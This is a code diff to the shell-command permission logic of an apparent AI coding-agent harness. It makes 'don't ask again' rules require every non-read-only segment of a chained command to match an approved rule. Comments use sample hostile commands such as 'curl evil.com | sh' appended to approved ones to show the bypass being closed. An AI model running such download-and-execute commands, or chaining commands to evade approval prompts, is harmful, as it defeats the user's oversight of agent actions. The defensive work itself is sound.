@@ -7,6 +7,7 @@
 import * as fs from 'node:fs'
 import * as path from 'node:path'
 
+import { isReadOnly, splitShellCommands } from '../tools/shell-utils.js'
 import { XCODE_DIR } from '../utils.js'
 
 export interface AllowRule {
@@ -142,6 +143,23 @@ const GLOBAL_FLAGS: Record<string, { valued: Set<string>; takesPlus?: boolean }>
 // internal (no trailing dash). Filters out `-flag`, `/flag`, and paths.
 const SUBCOMMAND_RE = /^[a-z][a-z0-9]*(-[a-z0-9]+)*$/
 
+// PowerShell Verb-Noun cmdlet shape: `Get-ChildItem`, `Sort-Object`,
+// `Invoke-WebRequest`, … One Verb segment (initial-cap + lowercase),
+// then ≥1 Noun segments separated by `-`. Each Noun must also start
+// with a capital letter so we don't accept `git-foo` (Unix-style command
+// with a dash) — those should keep going through the POSIX subcommand
+// path. The whole token is the prefix on its own: cmdlets take
+// `-Parameter Value` arguments, not subcommands.
+const VERB_NOUN_CMDLET_RE = /^[A-Z][a-z]+(?:-[A-Z][A-Za-z0-9]*)+$/
+
+// Compound-segment heads we treat as setup-only (a directory change
+// preceding the "real" command). Approving `cd D:\foo && npm test`
+// should anchor on `npm test`, not on the literal cd. Matches both
+// POSIX (`cd`, `pushd`, `popd`, `chdir`) and PowerShell (`Set-Location`,
+// `Push-Location`, `Pop-Location` plus their `sl`/`pushd`/`popd`
+// aliases). Case-insensitive because PowerShell is.
+const CD_LIKE_RE = /^(?:cd|chdir|pushd|popd|set-location|push-location|pop-location|sl)\b/i
+
 // Detects the `powershell` / `powershell.exe` / `pwsh` invocation prefix.
 // We don't try to match the WHOLE shape here — agents use a lot of flag
 // variations (`-NoProfile`, `-ExecutionPolicy Bypass`, `-File foo.ps1`,
@@ -174,6 +192,22 @@ const PS_INNER_CMD_RE = /["']?\s*(?:&\s*\{?\s*)?([A-Za-z][A-Za-z0-9]*(?:-[A-Za-z
  *   'powershell -ExecutionPolicy Bypass -c "git status"'     → 'git'
  *   'pwsh -Command "& { Get-Process }"'                      → 'Get-Process'
  *   'powershell -Command Get-Date'                           → 'Get-Date'
+ *   'Get-ChildItem -Recurse -Filter *.ts'                    → 'Get-ChildItem'
+ *   'Invoke-WebRequest -Uri http://api'                      → 'Invoke-WebRequest'
+ *   'cd /tmp && npm test'                                    → 'npm test'
+ *   'cd D:\\foo && npx tsc --noEmit | head -40'              → 'npx tsc'
+ *   'Set-Location D:\\foo; Get-ChildItem -Recurse | Sort-Object Name'
+ *                                                            → 'Get-ChildItem'
+ *   'npm install && curl bad.com'                            → null
+ *                                                              (two distinct
+ *                                                              non-readonly
+ *                                                              segments — no
+ *                                                              shared prefix,
+ *                                                              fall back to
+ *                                                              exact)
+ *   'git commit -m a && git push'                            → null   (segments
+ *                                                              disagree on
+ *                                                              prefix)
  *   'ls -la'                                                 → null
  *   ''                                                       → null
  */
@@ -181,11 +215,52 @@ export function extractCommandPrefix(command: string): string | null {
   const cmd = command.trim()
   if (!cmd) return null
 
-  // PowerShell first — its argument syntax doesn't follow the POSIX
-  // VAR=value convention so the env-var stripping below doesn't apply.
+  // PowerShell launcher commands (`powershell.exe -Command "..."`) own
+  // the entire string — the inner script may contain `;` and `|`, which
+  // splitShellCommands would mis-split. Handle them first and short-circuit.
   if (POWERSHELL_LAUNCHER_RE.test(cmd)) {
     return extractPowershellPrefix(cmd)
   }
+
+  // Compound commands (`;`, `&&`, `||`, `|`): derive a prefix only when
+  // every non-read-only segment agrees on the same prefix. Read-only
+  // segments (`cd /foo`, `head -40`, `Sort-Object Name`, …) are setup
+  // or display-only — they're skipped, so `cd /foo && npm test` anchors
+  // on `npm test`, but `git commit && git push` returns null because
+  // approving "git commit" must not auto-approve "git push".
+  //
+  // Splitting first also closes a security gap: without it, the old
+  // single-segment extractor would have happily returned `npm install`
+  // for `npm install && curl bad.com | sh`, letting an approved
+  // `npm install:*` rule silently approve the curl-and-pipe-to-sh tail.
+  // (`curl … | sh` itself is caught by isDestructive, but the principle
+  // generalises — any non-readonly second segment can't be trusted under
+  // a first segment's rule.)
+  const segments = splitShellCommands(cmd)
+  if (segments.length > 1) {
+    let derived: string | null = null
+    for (const seg of segments) {
+      if (isReadOnly(seg) || CD_LIKE_RE.test(seg.trim())) continue
+      const segPrefix = extractSingleCommandPrefix(seg)
+      if (!segPrefix) return null
+      if (derived === null) derived = segPrefix
+      else if (derived !== segPrefix) return null
+    }
+    return derived
+  }
+
+  return extractSingleCommandPrefix(cmd)
+}
+
+/**
+ * Extract a prefix from a single shell command (no compound operators).
+ * Internal worker for {@link extractCommandPrefix}; assumes the caller
+ * has already split on `;` / `&&` / `||` / `|` and is passing one
+ * segment at a time.
+ */
+function extractSingleCommandPrefix(command: string): string | null {
+  const cmd = command.trim()
+  if (!cmd) return null
 
   const tokens = cmd.split(/\s+/).filter(Boolean)
   if (tokens.length === 0) return null
@@ -212,6 +287,21 @@ export function extractCommandPrefix(command: string): string | null {
   }
 
   const rest = tokens.slice(i)
+  if (rest.length === 0) return null
+
+  // PowerShell cmdlets (Verb-Noun like `Get-ChildItem`) are their own
+  // prefix: cmdlets don't have subcommands the way `git`/`docker` do,
+  // they take `-Parameter` arguments. The previous code was waiting for
+  // a SUBCOMMAND_RE-shaped second token and silently returning null on
+  // anything like `Get-ChildItem -Recurse …`. Recognise the cmdlet
+  // shape and return it directly. This deliberately runs BEFORE the
+  // `rest.length < 2` gate so a bare `Get-Process` is also a valid
+  // prefix (single-cmdlet rules like `Get-ChildItem:*` are the analogue
+  // of `git status:*` for the PowerShell side).
+  if (VERB_NOUN_CMDLET_RE.test(rest[0]!)) {
+    return rest[0]!
+  }
+
   if (rest.length < 2) return null
 
   const firstLower = rest[0]!.toLowerCase()
@@ -298,13 +388,124 @@ function extractPowershellPrefix(cmd: string): string | null {
 }
 
 /**
+ * Like {@link extractCommandPrefix} but for compound commands returns the
+ * full set of distinct prefixes — one per non-read-only, non-cd segment.
+ *
+ * Returns `null` if any non-read-only segment has no derivable prefix
+ * (the caller has a richer fallback via {@link extractCompoundRules} now)
+ * or if every segment was filtered out as read-only / cd-like (mostly
+ * defensive — those auto-allow upstream).
+ *
+ * Kept exported for compatibility with consumers that only need the
+ * prefix list — current internal callers use the richer
+ * {@link extractCompoundRules}.
+ */
+export function extractCompoundPrefixes(command: string): string[] | null {
+  const cmd = command.trim()
+  if (!cmd) return null
+
+  if (POWERSHELL_LAUNCHER_RE.test(cmd)) {
+    const p = extractPowershellPrefix(cmd)
+    return p ? [p] : null
+  }
+
+  const segments = splitShellCommands(cmd)
+  if (segments.length === 0) return null
+
+  const seen = new Set<string>()
+  const out: string[] = []
+  for (const seg of segments) {
+    if (isReadOnly(seg) || CD_LIKE_RE.test(seg.trim())) continue
+    const p = extractSingleCommandPrefix(seg)
+    if (!p) return null
+    if (!seen.has(p)) {
+      seen.add(p)
+      out.push(p)
+    }
+  }
+  return out.length === 0 ? null : out
+}
+
+/**
+ * Per-segment rule extraction for compound commands. Returns one rule
+ * per non-read-only, non-cd segment:
+ *   - prefix rule when the segment has a derivable prefix (e.g.
+ *     `git commit -m foo` → `{ type: 'prefix', pattern: 'git commit' }`)
+ *   - segment-level exact rule otherwise (e.g. `curl evil.com` →
+ *     `{ type: 'exact', pattern: 'curl evil.com' }`)
+ *
+ * The mix is the point: `git commit && curl evil.com` was previously
+ * collapsing to a single full-command exact-match because `curl evil.com`
+ * has no prefix, throwing away the perfectly-derivable `git commit:*`.
+ * The label now reads `git commit:*, curl evil.com` and one click saves
+ * both rules. The matcher accepts an exact rule either against the full
+ * command (legacy) or against any non-readonly segment, so future
+ * `cd /tmp && git commit -m b && curl evil.com` auto-approves cleanly.
+ *
+ * Returns `null` if no segment yielded a rule (all-readonly compounds —
+ * auto-allowed upstream, never reaches us in practice) or if we hit a
+ * non-whitelisted env-var prefix that disqualifies the segment (same
+ * security gate as the single-cmd path).
+ */
+export function extractCompoundRules(command: string): AllowRule[] | null {
+  const cmd = command.trim()
+  if (!cmd) return null
+
+  if (POWERSHELL_LAUNCHER_RE.test(cmd)) {
+    const p = extractPowershellPrefix(cmd)
+    return p ? [{ tool: 'shell', pattern: p, type: 'prefix' }] : null
+  }
+
+  const segments = splitShellCommands(cmd)
+  if (segments.length === 0) return null
+
+  const seen = new Set<string>()
+  const out: AllowRule[] = []
+
+  for (const seg of segments) {
+    const trimmed = seg.trim()
+    if (isReadOnly(trimmed) || CD_LIKE_RE.test(trimmed)) continue
+
+    const prefix = extractSingleCommandPrefix(trimmed)
+    if (prefix) {
+      const key = `prefix:${prefix}`
+      if (!seen.has(key)) {
+        seen.add(key)
+        out.push({ tool: 'shell', pattern: prefix, type: 'prefix' })
+      }
+      continue
+    }
+
+    // No prefix — fall back to a segment-level exact rule. Strip safe
+    // env-vars so the matcher key stays canonical; reject if a
+    // non-whitelisted env-var assignment is present (same posture as
+    // extractSingleCommandPrefix).
+    const headEnv = /^([A-Za-z_]\w*)=/.exec(trimmed)
+    if (headEnv && !SAFE_ENV_VARS.has(headEnv[1]!)) return null
+    const exact = stripSafeEnvVars(trimmed)
+    if (!exact) return null
+    const key = `exact:${exact}`
+    if (!seen.has(key)) {
+      seen.add(key)
+      out.push({ tool: 'shell', pattern: exact, type: 'exact' })
+    }
+  }
+
+  return out.length === 0 ? null : out
+}
+
+/**
  * Generate the display label for the "don't ask again" option.
  * Returns `null` only for tools where a "don't ask again" affordance
  * makes no sense (enterPlanMode toggles a mode, not a recurring action).
  *
- * Shell with derivable prefix:    `git commit:*`
- * Shell without derivable prefix: `this exact command` (exact-match rule —
- *   covers Windows-style commands like `findstr /n …`, `cmd /c …`,
+ * Shell, single derivable prefix:   `git commit:*`
+ * Shell, multiple derivable prefixes (compound where segments disagree
+ *   — e.g. `git commit && git push`):  `git commit:*, git push:*`
+ *   — the click saves BOTH rules so subsequent compound invocations
+ *   stop prompting.
+ * Shell, no derivable prefix:       `this exact command` (exact-match
+ *   rule — covers Windows-style commands like `findstr /n …`, `cmd /c …`,
  *   `dir /b`, where the second token is a `/flag` or path that fails
  *   the prefix regex; without this fallback the user gets only Yes/No
  *   forever for repeated identical commands).
@@ -318,28 +519,40 @@ export function suggestRuleLabel(toolName: string, input: Record<string, unknown
   if (isMcp) return 'this MCP tool'
   if (toolName === 'shell') {
     const cmd = (input.command as string) ?? ''
-    const prefix = extractCommandPrefix(cmd)
-    if (prefix) return `${prefix}:*`
-    return 'this exact command'
+    const rules = extractCompoundRules(cmd)
+    if (!rules || rules.length === 0) return 'this exact command'
+    // Single rule whose exact pattern equals the full command → keep
+    // the legacy concise label rather than echoing the command back at
+    // the user. That preserves the readable "this exact command" wording
+    // for `findstr /n …` / `cmd /c …` invocations that have no derivable
+    // prefix at all.
+    if (rules.length === 1) {
+      const r = rules[0]!
+      if (r.type === 'exact' && r.pattern === stripSafeEnvVars(cmd)) return 'this exact command'
+    }
+    return rules.map((r) => (r.type === 'prefix' ? `${r.pattern}:*` : r.pattern)).join(', ')
   }
   return 'all edits this session'
 }
 
 /**
- * Build the AllowRule for a "don't ask again" approval.
+ * Build the AllowRule(s) for a "don't ask again" approval.
  *
- * - Shell with derivable prefix (e.g. `git commit`) → prefix rule, persisted
- * - Shell without derivable prefix                  → exact-match rule,
- *   persisted (mirrors Claude Code's `suggestionForExactCommand`
- *   fallback in `bashPermissions.ts`). Less reusable than a prefix rule
- *   (any arg change breaks the match) but at least suppresses repeated
- *   identical invocations — better than "Yes/No forever". The matcher
- *   compares against `stripEnvVars(cmd)` so leading `NODE_ENV=…` etc.
- *   don't defeat the rule.
- * - writeFile / edit                                → tool-wide allow,
- *   session-only (matches Claude Code).
+ * - Shell with derivable prefix(es) → one prefix rule per distinct
+ *   non-read-only segment. `git commit && git push` saves BOTH
+ *   `git commit:*` and `git push:*` on a single click (matching the
+ *   compound label shown to the user). Persisted to disk.
+ * - Shell without derivable prefix  → single exact-match rule, persisted
+ *   (mirrors Claude Code's `suggestionForExactCommand` fallback in
+ *   `bashPermissions.ts`). Less reusable than a prefix rule (any arg
+ *   change breaks the match) but at least suppresses repeated identical
+ *   invocations — better than "Yes/No forever". The matcher compares
+ *   against `stripEnvVars(cmd)` so leading `NODE_ENV=…` etc. don't defeat
+ *   the rule.
+ * - writeFile / edit  → single tool-wide allow, session-only (matches
+ *   Claude Code).
  *
- * `persist` indicates whether the rule should be saved to disk. Write
+ * `persist` indicates whether the rules should be saved to disk. Write
  * tools return persist=false; everything else returns persist=true.
  * Returns `null` only for the very few cases where no rule shape applies
  * (currently nothing — kept in the signature so callers stay defensive).
@@ -347,12 +560,12 @@ export function suggestRuleLabel(toolName: string, input: Record<string, unknown
 export function buildAllowRule(
   toolName: string,
   input: Record<string, unknown>,
-): { rule: AllowRule; persist: boolean } | null {
+): { rules: AllowRule[]; persist: boolean } | null {
   if (toolName === 'shell') {
     const cmd = (input.command as string) ?? ''
-    const prefix = extractCommandPrefix(cmd)
-    if (prefix) {
-      return { rule: { tool: toolName, pattern: prefix, type: 'prefix' }, persist: true }
+    const rules = extractCompoundRules(cmd)
+    if (rules && rules.length > 0) {
+      return { rules, persist: true }
     }
     // Strip *safe* env-var prefixes only — same key the matcher compares
     // against (stripSafeEnvVars). Non-whitelisted assignments stay in the
@@ -360,9 +573,9 @@ export function buildAllowRule(
     // accidentally auto-allow `findstr …` on its own.
     const exact = stripSafeEnvVars(cmd)
     if (!exact) return null
-    return { rule: { tool: toolName, pattern: exact, type: 'exact' }, persist: true }
+    return { rules: [{ tool: toolName, pattern: exact, type: 'exact' }], persist: true }
   }
-  return { rule: { tool: toolName, pattern: '*', type: 'tool' }, persist: false }
+  return { rules: [{ tool: toolName, pattern: '*', type: 'tool' }], persist: false }
 }
 
 function stripSafeEnvVars(command: string): string {
@@ -412,22 +625,65 @@ class SessionPermissionStore {
   }
 
   matches(toolName: string, input: Record<string, unknown>): boolean {
+    if (toolName !== 'shell') {
+      // Non-shell tools: tool-wide allow is the only rule shape we
+      // currently emit. Exact / prefix are shell-only.
+      for (const rule of this.rules) {
+        if (rule.tool !== toolName) continue
+        if (rule.type === 'tool') return true
+      }
+      return false
+    }
+
+    const cmd = (input.command as string) ?? ''
+
+    // First pass: tool-wide and exact rules operate on the full command
+    // string. (A user could in principle approve a destructive command
+    // exactly; we honour that.)
     for (const rule of this.rules) {
       if (rule.tool !== toolName) continue
-
       if (rule.type === 'tool') return true
+      if (rule.type === 'exact' && stripSafeEnvVars(cmd) === rule.pattern) return true
+    }
 
-      if (toolName === 'shell') {
-        const cmd = (input.command as string) ?? ''
-        const prefix = extractCommandPrefix(cmd)
-        if (rule.type === 'exact' && stripSafeEnvVars(cmd) === rule.pattern) return true
-        if (rule.type === 'prefix' && prefix) {
-          if (prefix === rule.pattern) return true
-          if (prefix.startsWith(rule.pattern + ' ')) return true
+    // Second pass: compound-aware prefix matching. Every non-read-only,
+    // non-cd-like segment of the command must individually match at
+    // least one persisted prefix rule. This is what lets a single click
+    // on `git commit && git push` save BOTH prefixes and have future
+    // `git commit -m foo && git push origin main` auto-approve.
+    //
+    // The "every segment must match" rule is the security gate: if a
+    // user has only ever approved `git commit:*`, a later
+    // `git commit -m a && curl evil.com | sh` still asks — `curl` has
+    // no matching rule. (The `| sh` is also caught by isDestructive
+    // upstream; the principle generalises beyond that one pattern.)
+    const segments = splitShellCommands(cmd)
+    const checkable = segments.filter((seg) => !isReadOnly(seg) && !CD_LIKE_RE.test(seg.trim()))
+    if (checkable.length === 0) return false
+
+    for (const seg of checkable) {
+      const segText = stripSafeEnvVars(seg.trim())
+      const segPrefix = extractSingleCommandPrefix(seg)
+      let segMatched = false
+      for (const rule of this.rules) {
+        if (rule.tool !== toolName) continue
+        if (rule.type === 'prefix' && segPrefix) {
+          if (segPrefix === rule.pattern || segPrefix.startsWith(rule.pattern + ' ')) {
+            segMatched = true
+            break
+          }
+        } else if (rule.type === 'exact' && segText === rule.pattern) {
+          // Per-segment exact: covers the `curl evil.com` half of a
+          // mixed compound rule set. The full-cmd exact-match check
+          // above already handled the legacy "approved the whole
+          // compound verbatim" case.
+          segMatched = true
+          break
         }
       }
+      if (!segMatched) return false
     }
-    return false
+    return true
   }
 
   clear(): void {
